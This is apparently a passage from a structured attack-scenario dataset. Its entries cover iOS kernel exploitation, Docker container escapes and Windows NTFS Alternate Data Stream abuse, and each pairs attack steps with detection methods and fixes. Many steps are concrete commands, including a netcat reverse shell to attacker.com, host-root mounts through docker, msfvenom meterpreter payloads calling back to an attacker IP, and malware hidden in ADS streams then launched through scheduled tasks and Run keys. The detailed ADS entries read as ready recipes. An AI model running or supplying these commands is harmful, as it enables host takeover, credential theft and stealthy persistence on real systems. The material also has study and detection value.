Step 2: Use this to cause a heap overflow—writing past the memory you’re supposed to. Step 3: With careful layout, use the overflow to corrupt control structures in memory. Step 4: Redirect execution to your code. Step 5: Confirm with debugging that you’ve achieved kernel code execution. Step 6: This method was used in popular jailbreaks like unc0ver.
Detection Method: Monitor crash logs; look for memory corruption near graphics service
Solution: Patch IOKit drivers; use bounds checks in memory writes

Title: AppleAVD or IOUSB Exploits
Attack Type: RCE via Multimedia or USB Subsystems
Scenario Description: AppleAVD (media) and IOUSB (USB handler) are complex. Vulnerabilities here allow remote or local code execution in kernel.
Tools Used: USB debugger, fuzzing tools, audio/video streams
Attack Steps: Step 1: Write or download a malformed video, image, or USB stream file. Step 2: Feed this into the AppleAVD (used for audio/video decode) or IOUSB (used for USB data). Step 3: The vulnerable driver fails to check input correctly, leading to heap corruption or buffer overflow. Step 4: Craft payload to run your shellcode as kernel-level code. Step 5: Use logs or debugger to confirm that payload executes.
Detection Method: Check device logs for abnormal decode/USB activity
Solution: Update AV/USB drivers; sandbox media decoding

Title: Kernel Heap Spray via mmap
Attack Type: Heap Memory Corruption for Privilege Gain
Scenario Description: Attackers use memory-mapped files or buffers to fill the heap with predictable data, then cause an overflow to corrupt control data.
Tools Used: mmap, Frida, GDB, custom memory filler script
Attack Steps: Step 1: Create many memory-mapped regions using the mmap() system call. Step 2: Fill them with predictable data or structures. This is called a heap spray. Step 3: Trigger a vulnerable driver or system function that overflows into the sprayed memory. Step 4: Carefully control the overflow so it changes system behavior (like running your code or giving you root). Step 5: Use a debugger to confirm the system is now under your control or privileges are elevated.
Detection Method: Monitor heap spray patterns or large mmap usage
Solution: Prevent heap overflow bugs; randomize heap layout

Title: Manipulation of task_for_pid(0)
Scenario Description: The task_for_pid() function is usually protected. Attackers try to trick it into giving access to the main kernel task (pid 0).
Attack Steps: Step 1: Use a sandboxed or semi-privileged app to call task_for_pid() with PID 0 (the kernel). Step 2: Combine this with a bug in task_get_special_port() or related APIs that allows bypassing checks. Step 3: If successful, this gives your app control of the kernel task, allowing you to run any code at kernel level. Step 4: Confirm with LLDB or Frida that kernel memory is accessible. Step 5: This method is used in advanced jailbreaks or privilege escalation exploits.
Vulnerability: Weak checks in special port handling
Detection Method: Logs of task_for_pid() attempts to PID 0; abnormal port access
Solution: Patch kernel APIs to validate all requests
Tags: Kernel Task Hijack, PID 0, Priv Esc

Title: CoreAudio/CoreGraphics Bugs
Scenario Description: Apple uses CoreAudio/CoreGraphics for sound and UI. Bugs here let attackers escape sandbox or execute code.
Tools Used: Xcode Instruments, CVE PoCs, Frida, lldb
Attack Steps: Step 1: Find known CVEs in CoreAudio or CoreGraphics. Step 2: Write an app that sends malformed audio/video or UI requests to the respective daemon. Step 3: The bug causes a crash or memory corruption. Step 4: With crafted payloads, escalate this into running code or reading memory outside the sandbox. Step 5: Confirm success using system logs or changes in UI/audio output.
Detection Method: Monitor logs for audio/UI crashes; fuzz these APIs
Solution: Patch media/UI daemons frequently; sandbox them further

Title: Misuse of DYLD / Env Injection
Scenario Description: On jailbroken systems, DYLD environment variables can be abused to load custom libraries before system code runs.
Attack Steps: Step 1: On a jailbroken device, set DYLD environment variables to point to your custom dynamic library. Step 2: Launch a target app or system binary. Step 3: The library is loaded before anything else and can hook functions or run code. Step 4: Use this for privilege escalation or system modification. Step 5: Confirm injection using otool or process inspection.
Detection Method: Look for unauthorized DYLD vars in environment
Solution: Lock down DYLD vars even on jailbroken systems

Title: PAC+BTI Bypass via Cache Leak
Scenario Description: Apple uses Pointer Authentication (PAC) and Branch Target Identification (BTI) for security. Attackers use cache timing to bypass them.
Tools Used: Side-channel timing tool, PAC probes, WebKit, JavaScript JIT
Attack Steps: Step 1: Set up a JavaScript or app environment with JIT and access to memory allocation. Step 2: Use cache timing to detect PAC-signed pointers and valid branches. Step 3: Use timing differences to guess PAC keys or valid pointer formats. Step 4: Build fake PAC pointers based on timing results. Step 5: Inject and execute your shellcode using these forged pointers. Step 6: Validate via debugger that shellcode runs despite PAC/BTI protections.
Detection Method: Look for abnormal cache usage or repeated timing checks
Solution: Use PAC hardening and constant-time verification

Title: Sandbox Profile Logic Bug
Attack Type: Broken Rule Handling in Sandbox Profile
Scenario Description: Apple's sandbox system uses profiles to control app behavior. A bug in the logic can allow escaping restrictions.
Attack Steps: Step 1: Write or modify a sandbox profile with conflicting rules (e.g., allow + deny rules in a certain order). Step 2: Launch an app under this profile using sandbox-exec. Step 3: If the system misinterprets the profile logic, it may allow actions that should be denied. Step 4: Use this to access files, network, or system services that should be blocked. Step 5: Confirm sandbox escape by accessing restricted system resources.
MITRE Technique: T1547.001 – Boot or Logon Autostart Exec
Detection Method: Audit sandbox profiles for contradicting rules
Solution: Fix profile parsers to prioritize deny rules

Title: UserFaultFD Emulation (Future)
Attack Type: Heap Spray with Memory Page Control
Scenario Description: Userfaultfd is a Linux feature that lets users trap and handle memory page faults in user space. Can be used for precise memory exploit setup.
Tools Used: Userfaultfd syscall, Linux kernel module, Frida, mmap
Attack Steps: Step 1: Write or run a user-space program that registers a memory range with userfaultfd. Step 2: When another part of your code tries to access this memory, the kernel triggers a page fault. Step 3: Instead of crashing, your handler runs custom logic (e.g., delaying the response or modifying the data). Step 4: Use this delay or data control to create a race condition or to prepare memory (like heap spray) just before a vulnerable function accesses it. Step 5: Combine this with a known heap overflow or UAF bug to hijack control flow. Step 6: Confirm control over the memory using a debugger or logs. Note: This technique is emerging and requires low-level skills and Linux kernel familiarity.
Detection Method: Monitor userfaultfd usage; log abnormal memory handler delay
Solution: Restrict access to userfaultfd; harden kernel fault handling logic

Title: Filesystem Race (Symlink Attack)
Scenario Description: Attacker creates a fast-changing symbolic link to fool system into using privileged paths at the wrong moment.
Tools Used: ln -s, strace, auditd, race condition tester
Attack Steps: Step 1: Identify a process or app that checks a file’s permissions, then opens it later (e.g., backup scripts, installers). Step 2: Create a symbolic link (symlink) to a safe file initially. Step 3: Once the app checks and approves the file, quickly replace the symlink to point to a privileged file (e.g., /etc/shadow). Step 4: If timed right, the app now reads or writes to the privileged file. Step 5: Use automation (e.g., bash loop) to increase success chances. Step 6: Confirm attack by seeing unauthorized file access or system change.
Detection Method: Audit symbolic link targets; monitor rapid symlink changes
Solution: Use O_NOFOLLOW, open file after checks, or use secure temp files

Title: Remote Code Execution via Docker API
Scenario Description: When Docker Engine's REST API is exposed without authentication, anyone can create containers that run commands on the host.
Tools Used: curl, Docker API, nmap, docker CLI
Attack Steps: Step 1: Use nmap or Shodan to find exposed ports (usually :2375) indicating an unauthenticated Docker API. Step 2: Connect to the Docker API using curl or docker client. Step 3: Send a POST request to create a new container with a shell or malicious payload. Step 4: Run the container, possibly mounting / from the host into the container. Step 5: Now execute commands that affect the host system via the container shell (e.g., modify system files or install malware). Step 6: This results in full system takeover.
Vulnerability: No API authentication or TLS enabled
Detection Method: Monitor open Docker API ports; inspect container creation logs
Solution: Require TLS/auth on Docker API; restrict firewall access
Tags: Docker RCE, API Exploit, Container Escape

Title: Mount Host Filesystem
Attack Type: Read/Write Full Host from Inside Container
Scenario Description: Attacker mounts the full host filesystem (/) into the container, gaining root access.
Attack Steps: Step 1: Attacker uses Docker CLI or API to start a new container. Step 2: Adds -v /:/mnt to mount the host’s root directory inside the container. Step 3: Inside the container, access /mnt/etc/shadow, /mnt/root/.ssh/, or /mnt/bin etc. Step 4: Read or modify files as if you were root on the host. Step 5: Can install backdoors or exfiltrate credentials.
Detection Method: Monitor for containers with unusual mounts like /:/
Solution: Restrict Docker group access; disable root mounts

Title: Escape to Host via Privileged Container
Scenario Description: When a container is launched with --privileged and access to /dev, it can interact with host devices or kernel interfaces.
Attack Steps: Step 1: Create a container with --privileged flag. Step 2: Mount sensitive paths like /dev, /proc, or /sys into the container. Step 3: Inside container, access device nodes or manipulate kernel parameters. Step 4: Write to /dev/mem or access /proc/kcore to gain kernel-level code execution. Step 5: Attacker can create persistent rootkits or escape sandbox completely.
Detection Method: Alert on use of --privileged flag or mounts to /dev
Solution: Block privileged container creation; use SELinux/AppArmor
Tags: Container Escape, Host Takeover, Docker Priv

Title: Copy Sensitive Files via Container
Scenario Description: Docker allows files inside a container to be copied to the host, which can be abused to extract secrets from mounted volumes.
Tools Used: docker cp, docker CLI, volume inspection
Attack Steps: Step 1: Attacker launches a container that has volumes mounted from the host (e.g., /etc, /root, or /home). Step 2: Inside the container, access files like /etc/shadow or .ssh/id_rsa. Step 3: Use docker cp <container_id>:/path/to/file . to copy these to the attacker’s machine. Step 4: Use stolen credentials for further access.
Vulnerability: Weak volume isolation and docker cp misuse
Detection Method: Monitor file access patterns and use of docker cp
Solution: Use volume restrictions; limit container access to sensitive paths
Tags: Data Theft, Docker Copy, Local Secrets

Title: User Impersonation on Host
Attack Type: Host User Mapping via Docker User Flag
Scenario Description: Docker containers can run as specific users. Attackers can map their container to a host user and escalate privileges.
Tools Used: docker run, Linux UID tools, id, whoami
Attack Steps: Step 1: Use docker run --user $(id -u) to run a container with your user ID mapped to the host. Step 2: Access host-mounted volumes (e.g., -v /home/user:/data) and write files that appear as coming from the host user. Step 3: Trick host processes into trusting container-written files. Step 4: If misconfigured, can escalate to root by mapping UID 0. Step 5: Check for effects by listing files owned by root or other users.
Detection Method: Monitor container user flags and ownership changes on host
Solution: Map to non-privileged users; isolate containers
Tags: UID Mapping, Docker User Flag, Priv Esc

Title: Lateral Movement to Other Containers
Scenario Description: Once inside one container, attackers can pivot to others using open ports, shared secrets, or service discovery.
Tools Used: nmap, curl, docker network inspect, Wireshark
Attack Steps: Step 1: Compromise a vulnerable container (e.g., with known web app bug). Step 2: Use docker network inspect to find connected containers. Step 3: Use tools like nmap or curl to probe ports inside Docker's virtual network. Step 4: Try default passwords, known exploits, or exposed APIs to access other containers. Step 5: Repeat process to move through app stack (e.g., from front-end to DB container). Step 6: Exfiltrate data or gain persistent access to multiple services.
Detection Method: Log lateral network traffic; monitor Docker networks
Solution: Segment internal services; restrict inter-container access; use firewalls and monitoring tools

Title: Rebind Attacks via Port Mapping
Scenario Description: Attackers map internal localhost-only services to external interfaces using Docker port mapping.
Tools Used: docker CLI, curl, browser, Docker API
Attack Steps: Step 1: Attacker uses docker run -p 127.0.0.1:22:22 to bind container port 22 to localhost, exposing it on the host. Step 2: Via DNS rebinding or browser-based exploitation, force a victim's browser to access 127.0.0.1:22 mapped from the attacker’s container. Step 3: Exploit localhost-only services like Redis, Jenkins, or Gitea unintentionally exposed. Step 4: Rebind DNS to target these services across multiple tabs or browser sessions. Step 5: Confirm internal service exposure by checking response headers or service banners.
Vulnerability: Port mapping misuse via Docker CLI
Detection Method: Monitor Docker port binds; prevent 127.0.0.1 or internal IP remaps
Solution: Restrict Docker port mapping to public interfaces only
Tags: DNS Rebinding, Port Mapping, Docker Exploit

Title: Mount Docker.sock Inside Container
Scenario Description: Docker socket (/var/run/docker.sock) gives full control over Docker daemon. If mounted, attacker can control host via container.
Tools Used: docker CLI, mounted socket, curl Docker API
Attack Steps: Step 1: Start or compromise a container with /var/run/docker.sock mounted. Step 2: Use curl or Docker CLI inside container to interact with Docker daemon. Step 3: Create new containers with mounted host volumes (-v /:/mnt) or privileged mode. Step 4: Execute commands or drop backdoors on host via new containers. Step 5: Full root-level control achieved from inside original container.
Detection Method: Detect /var/run/docker.sock mountpoints inside containers
Solution: Never mount docker.sock; audit volume mounts

Title: Container Image Poisoning
Attack Type: Supply Chain Attack via Image Repo
Scenario Description: Malicious actors upload trojaned images or replace known images with malware to hijack systems.
Attack Steps: Step 1: Attacker creates a malicious image mimicking a popular base image (e.g., ubuntu:latest, nginx:alpine). Step 2: Uploads it to public repo (e.g., DockerHub). Step 3: Victim pulls and runs the image unknowingly. Step 4: Malicious image includes backdoors, crypto miners, or startup scripts. Step 5: On container run, attacker gets shell or persistent access. Step 6: Can also replace images in private registry if credentials are leaked.
Detection Method: Use image signing and verification; monitor unexpected image downloads
Solution: Use trusted sources; validate image digest with docker pull --disable-content-trust=false
Tags: DockerHub, Image Poisoning, Supply Chain Risk

Title: Abuse BuildKit for SSRF/Code Injection
Scenario Description: Docker BuildKit allows sending remote URLs or secrets during builds, which can be used to leak or execute code.
Tools Used: Dockerfile, remote Git URL, BuildKit flags
Attack Steps: Step 1: Send a crafted Dockerfile using BuildKit’s RUN --mount=secret= or remote fetch. Step 2: Embed curl to internal services or include secrets in ARG/ENV during build. Step 3: Trigger remote build (e.g., via Git webhook or CI/CD). Step 4: Internal metadata, cloud keys, or SSRF data gets sent back to attacker via build logs or URL callbacks. Step 5: Can lead to RCE if RUN command executes injected payloads.
Detection Method: Monitor remote builds and Dockerfile usage; validate sources
Solution: Disable BuildKit for external sources; scan builds for unsafe mount/secrets

Title: Token / Credential Theft via ENV
Scenario Description: Environment variables often contain secrets. Attackers with inspect access can dump them.
Attack Steps: Step 1: Gain access to Docker CLI or container management interface. Step 2: Run docker inspect <container_id> to view environment variables passed at launch. Step 3: Search for AWS keys, DB passwords, or API tokens in Env section. Step 4: Use found credentials to access cloud services, internal DBs, or APIs. Step 5: Escalate privileges or move laterally.
Detection Method: Avoid using ENV for secrets; prefer Docker secrets or vault-based injection
Solution: Scan containers for env secrets; restrict inspect privileges
Tags: ENV Leak, Docker Secrets, Cloud Credential Theft

Title: Abuse Docker Events for Recon
Scenario Description: Docker exposes events (create, start, die, exec) that can be streamed by an attacker for monitoring.
Attack Steps: Step 1: Connect to Docker host or API. Step 2: Run docker events to subscribe to real-time container activity. Step 3: Watch for container names, image used, mounts, command line arguments. Step 4: Use timing and container lifecycle events to predict actions (e.g., backups, jobs). Step 5: Use gathered recon for future privilege escalation or container hijacking.
Detection Method: Restrict access to docker events; monitor for long-running listeners
Solution: Limit event streaming to admin roles; use Docker Audit

Title: Container DoS (Resource Exhaustion)
Scenario Description: By spawning many containers with unlimited CPU or memory, an attacker can crash or freeze the host system.
Attack Steps: Step 1: Attacker gains access to Docker host via socket or shell. Step 2: Launches many containers in a loop using docker run --cpus="" --memory="" to avoid limits. Step 3: Inside each container, runs CPU-heavy or memory-hogging tasks (e.g., infinite loops, memory allocators). Step 4: Monitor system using htop or top as host begins to slow down or hang. Step 5: Can cause swap usage, kernel OOM killer activation, or full crash. Step 6: Denial of service persists until containers are killed or host reboots.
Detection Method: Monitor number of containers and host load spikes
Solution: Apply default CPU/memory limits on Docker containers
Tags: Docker DoS, Resource Abuse, Host Exhaustion

Title: Create Reverse Shell Containers
Scenario Description: Attacker creates container that calls back to a listener server, giving full shell control remotely.
Attack Steps: Step 1: Attacker uses Docker CLI or API to launch a container with shell. Step 2: Adds Netcat or bash reverse shell command like nc attacker.com 4444 -e /bin/sh. Step 3: Starts listener on attacker's server using nc -lvnp 4444. Step 4: Once container runs, attacker gains shell into host or container. Step 5: Uses shell to inspect mounted volumes, escalate, or pivot. Step 6: This works especially if container has host volume or is privileged.
Detection Method: Monitor outbound traffic to rare ports or IPs
Solution: Block outbound container traffic; restrict DNS/egress rules
Tags: Reverse Shell, Remote Access, Docker Backdoor

Title: Load Malicious Kernel Modules
Scenario Description: With --privileged, attackers can load kernel modules directly into the host OS, bypassing userspace protections.
Attack Steps: Step 1: Launch a container with --privileged. Step 2: Install or copy .ko (kernel object) file into container. Step 3: Inside container, use insmod rootkit.ko or modprobe to load the kernel module. Step 4: Module hooks kernel functions, hides itself or logs keystrokes. Step 5: Persistence achieved even if container is removed.
Detection Method: Detect unexpected kernel modules using lsmod, dmesg
Solution: Deny --privileged usage; use kernel module signature verification
Tags: Kernel Module Abuse, Docker Privilege Escalation

Title: Modify Host Network Stack
Scenario Description: Containers with --network=host can interact with host networking directly, sniff packets or spoof traffic.
Attack Steps: Step 1: Launch a container using --network=host. Step 2: Inside, use tcpdump or Wireshark to sniff host traffic. Step 3: Modify host iptables, ARP cache, or DNS configs. Step 4: Use iptables rules to redirect traffic to malicious destinations or create MITM setup. Step 5: Exfiltrate data or inject malicious responses into victim connections.
Detection Method: Monitor use of --network=host; log interface-level traffic
Solution: Enforce bridge network isolation; disable --network=host unless needed

Title: Bypass AppArmor / Seccomp
Scenario Description: Docker normally restricts syscalls via Seccomp and paths via AppArmor. These can be bypassed by disabling profiles.
Attack Steps: Step 1: Create container with --security-opt seccomp=unconfined and --security-opt apparmor=unconfined. Step 2: Launch binaries or syscalls usually blocked (e.g., ptrace, setns, mknod). Step 3: Test for operations like mounting /proc, injecting into other processes, or spawning low-level threads. Step 4: Exploit host kernel via exposed features. Step 5: This removes runtime defense from container and reintroduces kernel attack surface.
Detection Method: Audit Docker container launch options; scan for missing seccomp/AppArmor
Solution: Apply default hardened seccomp profiles; disable unconfined mode
Tags: AppArmor Bypass, Seccomp Evasion, Sandbox Escape

Title: Volume Poisoning
Attack Type: Inject Host Configs via Mounted Volumes
Scenario Description: Attackers use writable mounts to poison host files like .bashrc, crontab, or SSH configs.
Attack Steps: Step 1: Start or compromise container with write access to mounted host folders (e.g., /home, /etc, /var). Step 2: Inside container, modify files such as .bashrc to run reverse shell on login, or cron.daily to install backdoors. Step 3: Write SSH keys into /root/.ssh/authorized_keys to enable passwordless login. Step 4: Wait for host admin to trigger the poisoned config. Step 5: Maintain persistent root-level access without detection.
Detection Method: Monitor volume write operations; alert on .bashrc/crontab modifications
Solution: Limit volume mounts to read-only where possible; use hostPath policies in Kubernetes

Title: Docker Group Misuse
Scenario Description: Any user added to the docker group can interact with the Docker daemon and gain root access to the host.
Attack Steps: Step 1: Attacker has access to a non-root user that is part of the docker group. Step 2: Runs a command like docker run -v /:/mnt --rm -it alpine chroot /mnt to mount the entire host filesystem. Step 3: Uses chroot to operate in host's root context. Step 4: Modifies /etc/shadow, adds SSH keys, or installs malware. Step 5: Full root access achieved despite being a non-root user.
Detection Method: Audit group memberships; detect Docker usage from non-root accounts
Solution: Restrict docker group access; isolate Docker CLI behind privilege boundary
Tags: Docker Group, Privilege Escalation, Host Takeover

Title: Exploit Docker Daemon via Malformed Image
Attack Type: Remote Code Execution via Crafted Image
Scenario Description: Malicious image metadata or layers can exploit bugs in Docker daemon during image load or extract.
Tools Used: docker CLI, malicious image, tar tools
Attack Steps: Step 1: Attacker crafts a malicious Docker image with manipulated metadata (e.g., symlinks, device files, long file names). Step 2: Publishes the image to DockerHub or sends it directly to target via exported tar. Step 3: Victim runs docker load or pulls the image using docker pull. Step 4: During unpacking, malformed layer content causes overflow, symlink traversal, or overwrite of system files. Step 5: Results in RCE or host file overwrite if the Docker daemon is unpatched.
Vulnerability: Unsafe parsing of image tarball structure
Detection Method: Monitor use of docker load from unverified sources; scan images
Solution: Use signed images only; scan image layers for abnormal structures
Tags: Malformed Image, RCE, Supply Chain Attack

Title: Storing Malicious Executables in Alternate Data Streams
Attack Type: Hidden Payload Storage via NTFS ADS
Scenario Description: Attackers store malicious executables inside NTFS Alternate Data Streams (ADS), which are not visible in normal file listings, to evade detection by antivirus tools.
Attack Steps: Step 1: Open a Windows machine (any version that uses NTFS file system, like Windows 10 or 11). Make sure it's your lab or a virtual machine for safe practice. Step 2: Confirm the system uses NTFS (necessary for ADS to work). Open Command Prompt and run: fsutil fsinfo volumeinfo C: — Check if the file system is NTFS. Step 3: Create a harmless dummy executable for testing. You can use Notepad to make a test file: open Notepad → type This is a fake EXE → Save as test.exe on Desktop. Step 4: Prepare to hide this test.exe inside another file's Alternate Data Stream (ADS). For example, create a visible text file: visible.txt using Notepad and save it on the Desktop. Step 5: Use the Command Prompt to hide test.exe inside visible.txt’s ADS using the type command. Run: type test.exe > visible.txt:hidden.exe — this creates an ADS named hidden.exe inside visible.txt. The file test.exe is now hidden inside the data stream of visible.txt. Step 6: Confirm that this data stream exists. Run: more < visible.txt:hidden.exe — this will read the content of the hidden stream. Alternatively, use PowerShell: Get-Item -Path .\visible.txt -Stream * to list all alternate streams inside the file. Step 7: Notice that traditional File Explorer or dir command won’t show this hidden content. The file appears normal. Step 8: Now, simulate executing the hidden payload. If it were a real executable and not just text, you could use PowerShell to extract and execute it like this: Start-Process -FilePath "visible.txt:hidden.exe". But since test.exe is not a real EXE, you'll see an error. In a real attack, this could be a reverse shell or malware. Step 9: For example, attacker can generate a malicious EXE using Metasploit: msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe > malware.exe, then hide it in ADS. Step 10: To execute the hidden malware, attacker can extract the ADS or use PowerShell to launch it directly if permissions allow. Step 11: Many antivirus tools ignore ADS or don’t scan them deeply, making this method effective for stealth attacks. Step 12: Clean up by running: notepad visible.txt:hidden.exe and deleting the stream content. Or delete the file entirely. Step 13: As a defender, you can scan for ADS using tools like Sysinternals Streams.exe or dir /R to list ADS manually. Step 14: This method is often used for persistence, obfuscation, or staging payloads for privilege escalation. Step 15: Only NTFS allows this — FAT32 and exFAT do not support ADS. It is a Windows-specific attack vector.
Vulnerability: NTFS allows hidden data in Alternate Data Streams
MITRE Technique: T1564.004 – Hide Artifacts: NTFS File Attributes
Detection Method: Use dir /R, PowerShell stream listing, or Sysinternals Streams tool to reveal hidden ADS content.
Solution: Disable NTFS ADS where possible; monitor with EDR; use antivirus that scans ADS streams; educate users.
Tags: NTFS, ADS, File Hiding, Windows Exploit, Persistence

Title: Privilege Escalation via Trusted Host File with ADS
Attack Type: Attach payload to system-trusted binary via ADS, then load via process hollowing
Scenario Description: Attackers store a malicious payload in an ADS attached to a trusted system binary, then execute it via process hollowing or other injection techniques to escalate privileges.
Tools Used: PowerShell, Process Hacker, msfvenom, Command Prompt
Attack Steps: Step 1: On a Windows NTFS system, identify a trusted system file (example: C:\Windows\System32\svchost.exe). This file is often whitelisted or allowed by antivirus and AppLocker. Step 2: Use Metasploit to generate a malicious payload: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe. This creates a reverse shell payload. Step 3: Hide the payload in the ADS of the trusted file using Command Prompt: type shell.exe > C:\Windows\System32\svchost.exe:payload.exe. This creates a hidden stream attached to svchost.exe that stores the shell. Step 4: Use PowerShell or another technique to extract and execute the hidden stream. Example: Start-Process "C:\Windows\System32\svchost.exe:payload.exe" or use manual process hollowing: create a suspended process of a legit executable (like notepad.exe), unmap its memory, inject the payload from ADS, and resume the process. Step 5: The malware runs under a trusted process, potentially bypassing antivirus, and if executed with SYSTEM privileges (e.g., via a service or scheduled task), it can escalate privileges. Step 6: To check if ADS exists on a file, use dir /R or PowerShell: Get-Item -Path C:\Windows\System32\svchost.exe -Stream *. Step 7: Cleanup: delete the stream using: notepad C:\Windows\System32\svchost.exe:payload.exe → clear content and save empty. Step 8: This is often chained with persistence or privilege escalation (e.g., placing ADS behind scheduled task or using trusted binaries for UAC bypass).
Vulnerability: ADS allows attaching executable streams to trusted files
MITRE Technique: T1055 – Process Injection; T1564.004 – NTFS File Attributes
Detection Method: Use dir /R, Sysinternals Streams, or PowerShell stream enumeration to detect hidden ADS payloads.
Solution: Disable or restrict ADS; enforce EDR scans of NTFS streams; disallow process creation from ADS locations.
Tags: NTFS, ADS, Process Hollowing, Privilege Escalation

Title: Bypass App Whitelisting using Alternate Data Streams
Attack Type: Evade Application Whitelisting Controls via NTFS ADS
Scenario Description: Attackers use ADS to hide executable payloads and execute them from trusted containers or file extensions to bypass application whitelisting policies.
Attack Steps: Step 1: On a test/lab Windows system with NTFS, check if application whitelisting is in place (e.g., via AppLocker). Try running notepad.exe or calc.exe to confirm what’s allowed. Step 2: Generate a simple test payload with msfvenom: msfvenom -p windows/x64/messagebox TEXT="Hello World!" -f exe -o msgbox.exe (you can also use a real payload if simulating reverse shell). Step 3: Create a decoy file like report.txt using Notepad and save it in a folder allowed by AppLocker (e.g., Desktop or Documents). Step 4: Hide the EXE into the decoy file using ADS: type msgbox.exe > report.txt:app.exe. The report.txt looks normal but contains the hidden payload in an alternate data stream. Step 5: Try executing the hidden EXE using PowerShell: Start-Process "report.txt:app.exe". This launches the hidden payload even though msgbox.exe would normally be blocked by AppLocker. Step 6: You’ve now successfully bypassed app whitelisting because the file was launched from a stream attached to a trusted/allowed file and directory. Step 7: For attackers, this is useful when AppLocker or WDAC blocks EXEs, but not PowerShell or CMD. They use those tools to extract and run the payload from ADS. Step 8: Defenders should detect these via EDR logs, use Get-Item -Stream *, or install Sysinternals Streams.exe. Step 9: Clean up by deleting the host file or removing stream data. Note: standard AV may miss the payload in ADS unless explicitly configured to scan them.
Vulnerability: App whitelisting ignores execution from ADS streams
MITRE Technique: T1564.004 – Hide Artifacts: NTFS File Attributes
Detection Method: Detect PowerShell/CMD executing ADS targets; use AppLocker with hash/path rules to block ADS execution.
Solution: Use strict policy to disallow ADS execution; restrict PowerShell use; scan ADS with AV and EDR tools.
Tags: App Whitelisting Bypass, NTFS ADS, Execution Evasion

Title: ADS + Scheduled Task for Persistence
Attack Type: Create ADS payload and launch it via schtasks or registry Run
Scenario Description: Attackers store malware in ADS and achieve persistence by scheduling it to run at system startup via Task Scheduler or Registry Run key.
Tools Used: PowerShell, CMD, Task Scheduler, Registry Editor, Metasploit
Attack Steps: Step 1: On a test Windows system using NTFS, generate a payload using Metasploit: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe. This payload creates a reverse shell. Step 2: Create a cover file such as logs.txt using Notepad and save it anywhere (e.g., C:\Users\Public\logs.txt). Step 3: Hide the payload inside the ADS of that file: type payload.exe > C:\Users\Public\logs.txt:backdoor.exe. The malware is now hidden and not visible in File Explorer or standard tools. Step 4: Test if the payload can be launched from ADS: Start-Process "C:\Users\Public\logs.txt:backdoor.exe" — if working, continue. Step 5: Use Task Scheduler to persistently launch this ADS payload at every startup. Run: schtasks /create /tn "UpdateTask" /tr "powershell.exe -WindowStyle Hidden -Command Start-Process 'C:\Users\Public\logs.txt:backdoor.exe'" /sc onlogon /rl highest /f. This creates a scheduled task that will execute the hidden malware every time someone logs in. Step 6: You can verify the task by opening taskschd.msc. The ADS file remains hidden from view, and the scheduled task launches it invisibly. Step 7: Alternatively, use the Registry Run key to do this: open regedit, go to HKCU\Software\Microsoft\Windows\CurrentVersion\Run, create a new string value named Updater, and set its value to: powershell -WindowStyle Hidden -Command Start-Process 'C:\Users\Public\logs.txt:backdoor.exe'. Step 8: On reboot, this will launch the malware without any user interaction. Step 9: You now have a stealthy persistence mechanism that hides both the payload and its launcher. Step 10: To detect this, defenders must check Task Scheduler for odd PowerShell paths and scan registry keys for ADS execution. Use dir /R to inspect NTFS files for hidden ADS streams. Step 11: Clean up by deleting the scheduled task: schtasks /delete /tn "UpdateTask" and deleting the hidden payload: del logs.txt (removes ADS too).
Vulnerability: ADS allows hidden payloads + unmonitored persistence hooks
MITRE Technique: T1053.005 – Scheduled Task; T1564.004 – NTFS File Attributes
Detection Method: Check scheduled tasks for PowerShell calls; scan registry Run keys for ADS indicators; use EDR for fileless payloads.
Solution: Block ADS execution via policy; monitor schtasks use; restrict PowerShell from running hidden ADS streams.
Tags: NTFS, ADS, Persistence, Scheduled Task, Registry Run

Title: ADS DLL Injection
Attack Type: Inject hidden DLL from ADS into a target process
Scenario Description: Malicious DLL is stored in ADS and injected into a running process (e.g., explorer.exe) using tools like PowerShell or manual remote thread injection.
Tools Used: PowerShell, Process Hacker, rundll32.exe, C/C++ Injector Script
Attack Steps: Step 1: On a Windows NTFS system, generate or compile a DLL payload using Metasploit or your own loader. Example: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o evil.dll. Step 2: Create a host file (e.g., host.txt) in a directory like C:\Users\Public\. Then run: type evil.dll > C:\Users\Public\host.txt:inject.dll to hide the DLL in an ADS stream. Step 3: The DLL now exists inside the ADS of host.txt but is invisible to normal users or AV. Confirm with dir /R. Step 4: You cannot directly load an ADS-based DLL via rundll32, so you must extract it at runtime using a script or inject it manually. Step 5: Use PowerShell to extract and load the DLL into memory. Example (simplified): Add-Type -TypeDefinition '[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string dll);' -Name 'WinAPI' -Namespace 'DLLLoader'; [DLLLoader.WinAPI]::LoadLibrary("C:\Users\Public\host.txt:inject.dll"). Alternatively, use a custom C injector that reads the stream, loads it into memory, and uses CreateRemoteThread to inject it into a process like explorer.exe. Step 6: Once injected, the DLL runs in the context of the target process and inherits its privileges, often evading detection and monitoring tools. Step 7: For stealth, attackers might pair this with UAC bypass or privilege escalation to inject into SYSTEM processes. Step 8: To verify this in a lab, monitor loaded modules using tools like Process Hacker or Process Explorer. ADS DLLs won’t show normal paths. Step 9: Detection involves scanning streams for DLL headers (MZ signatures), especially in common paths like Public, Downloads, or AppData. Step 10: Clean up: del host.txt removes both host file and the hidden DLL.
Vulnerability: ADS supports DLL payload storage + blind memory loading
MITRE Technique: T1055 – DLL Injection; T1564.004 – NTFS File Attributes
Impact: Stealth code execution, process hijack, privilege abuse
Detection Method: Use EDR to detect memory-injected DLLs; scan for loaded modules not present on disk; scan for ADS DLLs.
Solution: Restrict memory injection; use AMSI to catch PowerShell loaders; disable ADS via GPO or enable AV scan for ADS DLLs.
Tags: ADS, DLL Injection, Memory Load, Process Injection

Title: Elevated Execution via Explorer/Script
Attack Type: Use a script or file open trick to launch ADS under elevated context
Scenario Description: An attacker places a malicious payload in ADS of a trusted document. When a user with admin rights opens the visible file in Explorer or via a shortcut/script, the hidden ADS payload runs with elevated privileges.
Tools Used: Notepad, PowerShell, CMD, Task Scheduler, msfvenom, .lnk (shortcut)
